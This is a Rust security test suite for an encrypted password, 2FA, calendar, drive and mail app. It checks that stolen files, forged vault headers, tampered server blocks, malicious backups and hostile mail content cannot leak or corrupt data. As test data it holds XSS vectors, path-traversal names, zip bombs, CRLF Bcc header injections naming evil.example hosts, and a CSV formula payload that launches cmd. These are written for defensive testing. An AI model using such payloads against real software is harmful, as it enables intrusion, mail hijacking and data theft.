// SPDX-License-Identifier: AGPL-3.0-or-later
//! Attacks from outside. The attacker may read and change everything on the server, steal the
//! device's files (without the master password and the second factor), send mails, hand over
//! files and backups. Promises Z2 (no plaintext outside), Z3 (no crash), Z4 (right recipient).

use std::io::Write as _;
use std::sync::Arc;

use super::super::cal::{CalCalendar, CalEvent};
use super::super::mail::{MailAccountInput, OutgoingMail};
use super::*;
use crate::net::remote::{LocalFs, RemoteFs};

/// Words that must never show up readable in any file outside the running app.
const MARKS: &[&str] = &[
    "KlauPasswortX9",
    "KlauNutzerX9",
    "KlauNotizX9",
    "KlauTerminX9",
    "KlauOrtX9",
    "KlauDateiNameX9",
    "KlauDateiInhaltX9",
    "KlauMailPassX9",
    "KlauOrdnerX9",
    "KlauKontoX9",
    "KlauTresorX9",
];
/// 2FA secret "Hello!\xde\xad\xbe\xef" in Base32, its raw bytes must not show up either.
const TOTP_SECRET: &str = "JBSWY3DPEHPK3PXP";

fn all_files(dir: &std::path::Path) -> Vec<(std::path::PathBuf, Vec<u8>)> {
    files_under(dir).into_iter().filter_map(|p| std::fs::read(&p).ok().map(|d| (p, d))).collect()
}

/// Looks for every mark as UTF-8, UTF-16 and in hex or Base64.
fn assert_no_marks(what: &str, data: &[u8]) {
    use base64::Engine;
    for m in MARKS {
        let utf16: Vec<u8> = m.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        let forms: Vec<Vec<u8>> = vec![
            m.as_bytes().to_vec(),
            m.to_lowercase().into_bytes(),
            utf16,
            crate::kdf::hex(m.as_bytes()).into_bytes(),
            base64::engine::general_purpose::STANDARD.encode(m.as_bytes()).trim_end_matches('=').as_bytes()[..12]
                .to_vec(),
        ];
        for f in forms {
            assert!(!data.windows(f.len()).any(|w| w == f.as_slice()), "{what} contains {m} ({} bytes)", f.len());
        }
    }
    let raw = b"Hello!\xde\xad\xbe\xef";
    assert!(!data.windows(raw.len()).any(|w| w == raw), "{what} contains the raw 2FA secret");
    assert!(!data.windows(TOTP_SECRET.len()).any(|w| w == TOTP_SECRET.as_bytes()), "{what} contains the 2FA secret");
}

/// A suite with a mark in every area, synchronised to a folder server, with Drive and a mail account.
fn marked_suite(name: &str) -> (Dirs, Arc<GhulSuite>, std::path::PathBuf, Vec<u8>) {
    let d = Dirs::new(name);
    let kf = generate_keyfile();
    let s = d.suite();
    s.create(
        options(
            "pw-123456",
            Some(kf.clone()),
            &[(VaultKind::Pass, "KlauTresorX9"), (VaultKind::Totp, "T"), (VaultKind::Cal, "K")],
        ),
        None,
        None,
        None,
    )
    .unwrap();
    let server = std::env::temp_dir().join(format!("ghul-attack-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&server);
    let drive: Arc<dyn RemoteFs> = Arc::new(LocalFs::new(server.join("drive")));
    s.drive_use_folder(drive).unwrap();
    let pass = vault_id(&s, "KlauTresorX9");
    let mut e = login("Bank", "KlauNutzerX9", "KlauPasswortX9");
    e.fields.push(FieldData { name: "notes".into(), value: FieldValue::Text { value: "KlauNotizX9".into() } });
    s.save_entry(pass.clone(), e).unwrap();
    let mut t = totp_input();
    t.issuer = "Bank".into();
    t.account = "KlauKontoX9".into();
    t.secret_base32 = TOTP_SECRET.into();
    t.digits = 6;
    s.add_totp(vault_id(&s, "T"), t).unwrap();
    let cal = s
        .cal_save_calendar(CalCalendar {
            id: String::new(),
            vault_id: vault_id(&s, "K"),
            name: "C".into(),
            color: 1,
            default_reminder: 0,
            events: 0,
        })
        .unwrap();
    s.cal_save_event(CalEvent {
        calendar_id: cal,
        title: "KlauTerminX9".into(),
        location: "KlauOrtX9".into(),
        start: "2026-12-01T10:00".into(),
        end: "2026-12-01T11:00".into(),
        ..Default::default()
    })
    .unwrap();
    let folder = s.drive_create_folder(None, "KlauOrdnerX9".into()).unwrap();
    upload(&s, Some(folder), "KlauDateiNameX9.txt", b"KlauDateiInhaltX9 und mehr");
    s.mail_save_account(
        None,
        MailAccountInput {
            name: "Privat".into(),
            display_name: "Max".into(),
            email: "max@example.org".into(),
            username: "max@example.org".into(),
            password: "KlauMailPassX9".into(),
            servers: super::super::mail::mail_suggest_servers("max@example.org".into()),
            imap_cert: None,
            smtp_cert: None,
            signature: String::new(),
        },
    )
    .unwrap();
    s.sync_folder(&LocalFs::new(server.join("sync"))).unwrap();
    (d, s, server, kf)
}

#[test]
fn stolen_device_files_server_and_backup_reveal_nothing() {
    let (d, s, server, _kf) = marked_suite("leak");
    let backup = s.suite_backup().unwrap();
    let export = s.export_suite().unwrap();
    s.lock();
    // Everything the app wrote: its folder (vault files, local state), the server, the backup.
    for (p, data) in all_files(&d.root).into_iter().chain(all_files(&server)) {
        assert_no_marks(&p.display().to_string(), &data);
    }
    // File names say nothing either (F23): not here, not on the server, not in the backup.
    for p in files_under(&d.root).into_iter().chain(files_under(&server)) {
        let name = p.file_name().unwrap().to_string_lossy().into_owned();
        assert_no_marks(&format!("file name {name}"), name.as_bytes());
    }
    let _ = &export;
    // Inside the backup ZIP as well (entries stored, but check unpacked too).
    let mut z = zip::ZipArchive::new(std::io::Cursor::new(backup)).unwrap();
    for i in 0..z.len() {
        let mut f = z.by_index(i).unwrap();
        let mut buf = Vec::new();
        std::io::Read::read_to_end(&mut f, &mut buf).unwrap();
        assert_no_marks(&format!("backup entry {}", f.name().unwrap()), &buf);
        assert_no_marks("backup entry name", f.name().unwrap().as_bytes());
    }
    let _ = std::fs::remove_dir_all(&server);
}

#[test]
fn stolen_files_do_not_open_without_both_factors() {
    let (d, s, server, kf) = marked_suite("steal");
    s.lock();
    // A thief copies the folder to another device.
    let thief = Dirs::new("thief");
    copy_suite(&server.join("sync"), &thief);
    let t = thief.suite();
    assert!(t.unlock("pw-123456".into(), None, None, None, None).is_err(), "password alone");
    assert!(t.unlock("falsch".into(), None, None, None, Some(kf.clone())).is_err(), "key file alone");
    assert!(t.unlock("pw-123456".into(), None, None, None, Some(generate_keyfile())).is_err(), "another key file");
    let mut bent = kf.clone();
    let last = bent.len() - 1;
    bent[last] ^= 1;
    assert!(t.unlock("pw-123456".into(), None, None, None, Some(bent)).is_err(), "changed key file");
    // The owner still can.
    t.unlock("pw-123456".into(), None, None, None, Some(kf)).unwrap();
    drop(d);
    let _ = std::fs::remove_dir_all(&server);
}

#[test]
fn a_server_cannot_change_or_swap_drive_files() {
    let (_d, s, server, _kf) = marked_suite("drive");
    let a = upload(&s, None, "a.bin", &vec![1u8; 9_000_000]);
    let b = upload(&s, None, "b.bin", &vec![2u8; 9_000_000]);
    let blocks: Vec<std::path::PathBuf> = files_under(&server.join("drive/drive/blocks"));
    assert!(blocks.len() >= 4, "{blocks:?}");
    let ok_or_err = |id: &str, want: &[u8]| {
        let n = s.drive_file_blocks(id.into());
        let got: Result<Vec<u8>, _> = n.and_then(|n| {
            (0..n).map(|i| s.drive_download_block(id.into(), i)).collect::<Result<Vec<_>, _>>().map(|v| v.concat())
        });
        if let Ok(g) = got {
            assert!(g == want, "a changed server file gave wrong data instead of an error");
        }
    };
    // 1. A flipped bit in a block.
    let victim = &blocks[0];
    let orig = std::fs::read(victim).unwrap();
    let mut bad = orig.clone();
    let mid = bad.len() / 2;
    bad[mid] ^= 0x40;
    std::fs::write(victim, &bad).unwrap();
    ok_or_err(&a, &vec![1u8; 9_000_000]);
    ok_or_err(&b, &vec![2u8; 9_000_000]);
    std::fs::write(victim, &orig).unwrap();
    // 2. Two blocks swapped (same size, other content).
    let (x, y) = (std::fs::read(&blocks[0]).unwrap(), std::fs::read(&blocks[blocks.len() - 1]).unwrap());
    std::fs::write(&blocks[0], &y).unwrap();
    std::fs::write(&blocks[blocks.len() - 1], &x).unwrap();
    ok_or_err(&a, &vec![1u8; 9_000_000]);
    ok_or_err(&b, &vec![2u8; 9_000_000]);
    std::fs::write(&blocks[0], &x).unwrap();
    std::fs::write(&blocks[blocks.len() - 1], &y).unwrap();
    // 3. The index replaced by garbage or by a file of the attacker: an error, no crash, no foreign entries.
    let index = server.join("drive/drive/index.ghldrv");
    let good = std::fs::read(&index).unwrap();
    let mut forged = b"GHULDRV1".to_vec();
    forged.extend_from_slice(&[0u8; 24]);
    forged.extend_from_slice(b"attacker index");
    std::fs::write(&index, &forged).unwrap();
    assert!(s.drive_list(None, true).is_err());
    std::fs::write(&index, &good).unwrap();
    assert!(s.drive_list(None, true).is_ok());
    // 4. Blocks deleted: an error, never partial or foreign data.
    for blk in &blocks {
        std::fs::remove_file(blk).unwrap();
    }
    assert!(s.drive_download_block(a.clone(), 0).is_err());
    let _ = std::fs::remove_dir_all(&server);
}

#[test]
fn forged_or_weakened_vault_files_are_refused() {
    let (_d, s, server, kf) = marked_suite("forge");
    let pass = vault_id(&s, "KlauTresorX9");
    let file = server.join("sync/suite").join(vault_file(&s, &pass));
    let good = std::fs::read(&file).unwrap();
    let parsed = crate::vault::LockedContainer::parse(&good).unwrap();
    // KDF parameters sit in the clear header (memory ‖ iterations ‖ parallelism ‖ salt): an
    // attacker can make them weak, out of range or as expensive as allowed.
    let salt = parsed.header().kdf.salt;
    let at = good.windows(32).position(|w| w == salt).unwrap();
    for (memory, iterations, parallelism) in
        [(8u32, 1u32, 1u32), (u32::MAX, u32::MAX, u32::MAX), (2 * 1024 * 1024, 64, 1), (64 * 1024, 3, 0), (0, 0, 0)]
    {
        let t = std::time::Instant::now();
        let mut forged = good.clone();
        forged[at - 12..at - 8].copy_from_slice(&memory.to_le_bytes());
        forged[at - 8..at - 4].copy_from_slice(&iterations.to_le_bytes());
        forged[at - 4..at].copy_from_slice(&parallelism.to_le_bytes());
        std::fs::write(&file, &forged).unwrap();
        let r = s.sync_folder(&LocalFs::new(server.join("sync")));
        assert!(t.elapsed().as_secs() < 30, "a forged KDF made the app work for {:?}", t.elapsed());
        assert!(!matches!(r, Ok(ref rep) if rep.deleted > 0));
        assert_eq!(titles(&s), vec!["Bank"], "data intact ({memory}, {iterations}, {parallelism})");
    }
    std::fs::write(&file, &good).unwrap();
    // A file from another suite under the same name.
    let other = Dirs::new("forge-other");
    let o = other.suite();
    o.create(options("pw-123456", Some(kf.clone()), &[(VaultKind::Pass, "KlauTresorX9")]), None, None, None).unwrap();
    o.save_entry(vault_id(&o, "KlauTresorX9"), login("Angreifer", "a", "b")).unwrap();
    let theirs = other.storage().read(vault_file(&o, &vault_id(&o, "KlauTresorX9"))).unwrap().unwrap();
    std::fs::write(&file, &theirs).unwrap();
    s.sync_folder(&LocalFs::new(server.join("sync"))).unwrap();
    assert_eq!(titles(&s), vec!["Bank"], "nothing from the foreign file");
    let _ = std::fs::remove_dir_all(&server);
}

#[test]
fn backups_with_path_tricks_and_bombs_write_nothing_outside() {
    let target = Dirs::new("restore-attack");
    let outside = target.root.join("outside.ghlpss");
    let make = |entries: &[(&str, &[u8])]| {
        let mut out = std::io::Cursor::new(Vec::new());
        {
            let mut z = zip::ZipWriter::new(&mut out);
            let opts = zip::write::SimpleFileOptions::default().compression_method(zip::CompressionMethod::Deflated);
            for (n, d) in entries {
                z.start_file(*n, opts).unwrap();
                z.write_all(d).unwrap();
            }
            z.finish().unwrap();
        }
        out.into_inner()
    };
    let tricks = [
        "../outside.ghlpss",
        "..\\outside.ghlpss",
        "/tmp/abs.ghlpss",
        "C:\\x.ghlpss",
        "suite.ghlsuite:stream",
        ".hidden.ghlpss",
        "a/../../outside.ghlpss",
        "con.ghlpss",
        "x\0.ghlpss",
        "x\u{202e}sspslhg.exe",
    ];
    for t in tricks {
        let zip = make(&[("suite.ghlsuite", b"GHULSUIT"), (t, b"evil")]);
        let s = target.suite();
        let _ = s.restore_backup(zip);
        assert!(!outside.exists(), "{t} wrote outside");
        for f in target.storage().list().unwrap() {
            assert!(!f.contains(['/', '\\', ':', '\0']) && !f.starts_with('.'), "{t} created {f:?}");
        }
        let _ = std::fs::remove_dir_all(target.root.join("vault"));
    }
    // A bomb: a few kilobytes that unpack to far more than allowed (limit lowered for the test).
    let mut out = std::io::Cursor::new(Vec::new());
    {
        let mut z = zip::ZipWriter::new(&mut out);
        let opts = zip::write::SimpleFileOptions::default()
            .compression_method(zip::CompressionMethod::Deflated)
            .large_file(true);
        z.start_file("suite.ghlsuite", opts).unwrap();
        z.write_all(b"GHULSUIT").unwrap();
        z.start_file("bomb.ghlpss", opts).unwrap();
        let zeros = vec![0u8; 1 << 20];
        for _ in 0..40 {
            z.write_all(&zeros).unwrap();
        }
        z.finish().unwrap();
    }
    let bomb = out.into_inner();
    assert!(bomb.len() < 200_000);
    let s = target.suite();
    assert!(s.restore_backup_limited(bomb, 16 * 1024 * 1024).is_err(), "a bomb must be refused");
}

#[test]
fn mail_headers_cannot_be_injected() {
    let (_d, s, server, _kf) = marked_suite("headers");
    let acc = s.mail_accounts().unwrap()[0].id.clone();
    let evil = OutgoingMail {
        account_id: acc,
        to: vec!["bob@example.org".into()],
        cc: vec![],
        bcc: vec![],
        subject: "Hallo\r\nBcc: spy@evil.example\r\nX-Evil: 1".into(),
        text: "Text".into(),
        in_reply_to: "<x@y>\r\nBcc: spy2@evil.example".into(),
        attachments: vec![super::super::mail::OutgoingAttachment {
            name: "rechnung.pdf\r\nContent-Type: text/html".into(),
            mime: "application/pdf\r\nX-Evil: 2".into(),
            data: b"%PDF".to_vec(),
        }],
        pgp: false,
    };
    let (raw, rcpt) = super::super::mail::build_for_tests(&s, &evil).unwrap();
    assert_eq!(rcpt, vec!["bob@example.org".to_string()], "no extra recipients");
    let text = String::from_utf8_lossy(&raw);
    // The words may stay in the subject as text; they must not become headers of their own.
    for bad in ["\nBcc:", "\nX-Evil:", "\nContent-Type: text/html\r\n\r\n", "In-Reply-To: <x@y>\r\nBcc", "spy2@evil"] {
        assert!(!text.contains(bad), "injected {bad:?}:\n{text}");
    }
    // Addresses with line breaks are refused.
    let mut bad_rcpt = evil.clone();
    bad_rcpt.to = vec!["bob@example.org\r\nBcc: spy@evil.example".into()];
    assert!(super::super::mail::build_for_tests(&s, &bad_rcpt)
        .map(|(_, r)| r.len() == 1 && r[0] == "bob@example.org")
        .unwrap_or(true));
    let _ = std::fs::remove_dir_all(&server);
}

#[test]
fn html_mails_cannot_run_code_or_hide_links() {
    let vectors = [
        "<script>alert(1)</script>",
        "<SCRIPT SRC=//evil/x.js></SCRIPT>",
        "<img src=x onerror=alert(1)>",
        "<img src=\"x\" onerror\n=alert(1)>",
        "<body onload=alert(1)>",
        "<svg><script>alert(1)</script></svg>",
        "<svg onload=alert(1)>",
        "<iframe src=\"https://evil\"></iframe>",
        "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
        "<object data=\"javascript:alert(1)\"></object>",
        "<embed src=\"javascript:alert(1)\">",
        "<form action=\"https://evil\"><input name=pw type=password></form>",
        "<meta http-equiv=\"refresh\" content=\"0;url=https://evil\">",
        "<base href=\"https://evil/\"><a href=\"/x\">x</a>",
        "<link rel=stylesheet href=\"https://evil/x.css\">",
        "<style>@import 'https://evil/x.css'; body{background:url(javascript:alert(1))}</style>",
        "<div style=\"background:url(javascript:alert(1))\">x</div>",
        "<a href=\"javascript:alert(1)\">j</a>",
        "<a href=\"JaVaScRiPt:alert(1)\">j</a>",
        "<a href=\"jav&#x09;ascript:alert(1)\">j</a>",
        "<a href=\"jav\tascript:alert(1)\">j</a>",
        "<a href=\" javascript:alert(1)\">j</a>",
        "<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)\">j</a>",
        "<a href=\"vbscript:msgbox(1)\">v</a>",
        "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">d</a>",
        "<a href=\"file:///etc/passwd\">f</a>",
        "<a href=\"intent://evil#Intent;end\">i</a>",
        "<a href=\"//evil.example\">p</a>",
        "<img src=\"data:image/svg+xml,<svg onload=alert(1)>\">",
        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        "<<script>alert(1)//<</script>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<!--<script>-->alert(1)<!--</script>-->",
        "<a href=\"https://bank.example\">https://bank.example</a><a href=\"https://evil.example\">https://bank.example</a>",
    ];
    for v in vectors {
        let mail = super::super::mailhtml::parse(v);
        for b in &mail.blocks {
            for span in &b.spans {
                let link = span.link.to_ascii_lowercase();
                assert!(
                    link.is_empty()
                        || link.starts_with("https://")
                        || link.starts_with("http://")
                        || link.starts_with("mailto:"),
                    "{v}: link {:?}",
                    span.link
                );
                let t = span.text.to_ascii_lowercase();
                assert!(
                    !t.contains("<script") && !t.contains("onerror=") && !t.contains("javascript:"),
                    "{v}: text {:?}",
                    span.text
                );
            }
        }
    }
    // A link that shows one address and points to another tells the reader where it really goes.
    let tricky = super::super::mailhtml::parse("<a href=\"https://evil.example/login\">https://bank.example/login</a>");
    let span = tricky.blocks.iter().flat_map(|b| &b.spans).find(|s| !s.link.is_empty()).unwrap();
    assert!(span.text.contains("evil.example") || !span.text.contains("bank.example"), "{span:?}");
}

#[test]
fn exports_are_safe_to_open_in_a_spreadsheet() {
    let d = Dirs::new("csv");
    let s = d.suite();
    s.create(options("pw-123456", Some(generate_keyfile()), &[(VaultKind::Pass, "P")]), None, None, None).unwrap();
    let pass = vault_id(&s, "P");
    // A website stored a "user name" that is a spreadsheet formula (via autofill save, import ...).
    let formulas = ["=HYPERLINK(\"https://evil\",\"x\")", "+cmd|' /C calc'!A0", "-2+3", "@SUM(1)", "\t=1", "'=quoted"];
    for f in formulas {
        s.save_entry(pass.clone(), login(f, f, f)).unwrap();
    }
    let csv = String::from_utf8(s.export_plain(pass.clone(), "pw-123456".into()).unwrap()).unwrap();
    for line in csv.lines().skip(1) {
        for cell in line.split(',') {
            let c = cell.trim_start_matches('"');
            assert!(!c.starts_with(['=', '+', '-', '@', '\t']), "formula cell {cell:?} in {line:?}");
        }
    }
    // Importing the own export gives the exact passwords back (titles are trimmed as always).
    let other = Dirs::new("csv-back");
    let o = other.suite();
    o.create(options("pw-123456", Some(generate_keyfile()), &[(VaultKind::Pass, "P")]), None, None, None).unwrap();
    let ov = vault_id(&o, "P");
    o.import_data(csv.into_bytes(), "ghulsuite.csv".into(), Some(ov.clone()), None, false, None).unwrap();
    let mut got: Vec<String> = o
        .list_entries(VaultKind::Pass, None)
        .unwrap()
        .into_iter()
        .map(|e| {
            match o
                .get_entry(ov.clone(), e.id)
                .unwrap()
                .fields
                .iter()
                .find(|f| f.name == "password")
                .map(|f| f.value.clone())
            {
                Some(FieldValue::Secret { value }) => value,
                other => panic!("{other:?}"),
            }
        })
        .collect();
    let mut want: Vec<String> = formulas.iter().map(|f| f.to_string()).collect();
    got.sort();
    want.sort();
    assert_eq!(got, want);
}

/// Names in a server's folder listing come from the server. Whatever it lists, nothing is
/// written outside the suite folder, nothing odd is created, and the sync still works.
#[test]
fn a_server_cannot_plant_files_through_names() {
    let (d, s, server, _kf) = marked_suite("names");
    let dir = server.join("sync/suite");
    let good = std::fs::read(dir.join(vault_file(&s, &vault_id(&s, "KlauTresorX9")))).unwrap();
    // What a file system allows as names on the server side.
    for name in [
        ".versteckt.ghlpss",
        "aux.ghlpss",
        "CON.ghlpss",
        "nul.ghltotp",
        "a:b.ghlpss",
        "x\u{202e}sspslhg.exe.ghlpss",
        "ende .ghlpss ",
        "tab\there.ghlpss",
        "stern*.ghlpss",
        "frage?.ghlpss",
        "pipe|.ghlpss",
        "<kleiner>.ghlpss",
        "zitat\".ghlpss",
        "neue\nzeile.ghlpss",
        "..ghlpss",
    ] {
        let _ = std::fs::write(dir.join(name), &good);
    }
    /// A server that lists names no file system would allow.
    struct Liar(LocalFs);
    impl RemoteFs for Liar {
        fn list(&self, dir: &str) -> crate::net::NetResult<Vec<crate::net::remote::RemoteEntry>> {
            let mut l = self.0.list(dir)?;
            for n in [
                "../raus.ghlpss",
                "..\\raus.ghlpss",
                "/tmp/abs.ghlpss",
                "a/b.ghlpss",
                "C:\\x.ghlpss",
                "\0.ghlpss",
                "../../suite.ghlsuite",
            ] {
                l.push(crate::net::remote::RemoteEntry { name: n.into(), is_dir: false, size: 10 });
            }
            Ok(l)
        }
        fn read(&self, path: &str) -> crate::net::NetResult<Option<Vec<u8>>> {
            self.0.read(path)
        }
        fn write(&self, path: &str, data: &[u8]) -> crate::net::NetResult<()> {
            self.0.write(path, data)
        }
        fn delete(&self, path: &str) -> crate::net::NetResult<()> {
            self.0.delete(path)
        }
        fn mkdir_all(&self, dir: &str) -> crate::net::NetResult<()> {
            self.0.mkdir_all(dir)
        }
    }
    s.sync_folder(&Liar(LocalFs::new(server.join("sync")))).unwrap();
    assert_eq!(titles(&s), vec!["Bank"]);
    for f in d.storage().list().unwrap() {
        assert!(super::super::storage::plain_file_name(&f), "odd local file {f:?}");
    }
    let outside: Vec<_> = files_under(&d.root)
        .into_iter()
        .filter(|p| !p.starts_with(d.root.join("vault")) && !p.starts_with(d.root.join("local")))
        .collect();
    assert!(outside.is_empty(), "{outside:?}");
    assert!(!d.root.parent().unwrap().join("raus.ghlpss").exists());
    let _ = std::fs::remove_dir_all(&server);
}

/// Passwords, keys and codes never appear in debug output (logs, crash reports, error texts).
#[test]
fn secrets_never_show_up_in_debug_output_or_errors() {
    use super::super::mail::{MailAccountInput, MailPollConfig, MailSecurity};
    use super::super::servers::{ServerInput, ServerKind, UploadAccess};
    const M: &str = "DebugGeheimX7";
    let servers = super::super::mail::mail_suggest_servers("a@example.org".into());
    let shown = [
        format!(
            "{:?}",
            MailAccountInput {
                name: "n".into(),
                display_name: "d".into(),
                email: "a@example.org".into(),
                username: "u".into(),
                password: M.into(),
                servers: servers.clone(),
                imap_cert: None,
                smtp_cert: None,
                signature: String::new()
            }
        ),
        format!(
            "{:?}",
            MailPollConfig {
                account_id: "a".into(),
                account_name: "n".into(),
                host: "h".into(),
                port: 993,
                security: MailSecurity::Tls,
                username: "u".into(),
                password: M.into(),
                cert: None
            }
        ),
        format!(
            "{:?}",
            ServerInput {
                kind: ServerKind::Ftps,
                name: "n".into(),
                host: "h".into(),
                port: 21,
                user: "u".into(),
                password: Some(M.into()),
                base: "b".into(),
                url: String::new(),
                upload: Some(UploadAccess {
                    host: "h".into(),
                    port: 21,
                    user: "u".into(),
                    password: M.into(),
                    cert: String::new(),
                    dir: "d".into(),
                    data_dir: String::new()
                })
            }
        ),
        format!("{:?}", options(M, Some(M.as_bytes().to_vec()), &[(VaultKind::Pass, "P")])),
        format!("{:?}", login("t", "u", M)),
        format!("{:?}", TotpInput { secret_base32: M.into(), ..totp_input() }),
        format!(
            "{:?}",
            super::super::shares::ShareOptions {
                server_id: "s".into(),
                password: Some(M.into()),
                expires_days: 0,
                max_downloads: 0
            }
        ),
    ];
    for s in &shown {
        assert!(!s.contains(M) && !s.contains(&format!("{:?}", M.as_bytes())), "{s}");
    }
    // Errors from wrong input name no secret either.
    let d = Dirs::new("debug");
    let s = d.suite();
    let kf = generate_keyfile();
    s.create(options(M, Some(kf.clone()), &[(VaultKind::Pass, "P")]), None, None, None).unwrap();
    let pass = vault_id(&s, "P");
    s.save_entry(pass.clone(), login("Bank", "u", "PasswortGeheimX7")).unwrap();
    s.lock();
    let errors = [
        format!("{:?}", s.unlock(format!("{M}x"), None, None, None, Some(kf.clone())).unwrap_err()),
        format!("{:?}", s.unlock(M.into(), None, None, None, Some(M.as_bytes().to_vec())).unwrap_err()),
        format!("{:?}", s.export_plain(pass.clone(), M.into()).unwrap_err()),
    ];
    for e in &errors {
        assert!(!e.contains(M) && !e.contains("PasswortGeheimX7"), "{e}");
    }
}

/// An import archive that claims to be small but unpacks to gigabytes is cut off.
#[test]
fn import_archives_cannot_exhaust_memory() {
    let mut out = std::io::Cursor::new(Vec::new());
    {
        let mut z = zip::ZipWriter::new(&mut out);
        let opts = zip::write::SimpleFileOptions::default()
            .compression_method(zip::CompressionMethod::Deflated)
            .large_file(true);
        z.start_file("data.json", opts).unwrap();
        let block = vec![b' '; 1 << 20];
        for _ in 0..200 {
            z.write_all(&block).unwrap();
        }
        z.finish().unwrap();
    }
    let bomb = out.into_inner();
    assert!(bomb.len() < 1_000_000, "{}", bomb.len());
    let t = std::time::Instant::now();
    assert!(super::super::import::parse(&bomb, "export.zip").is_err());
    assert!(t.elapsed().as_secs() < 20);
}
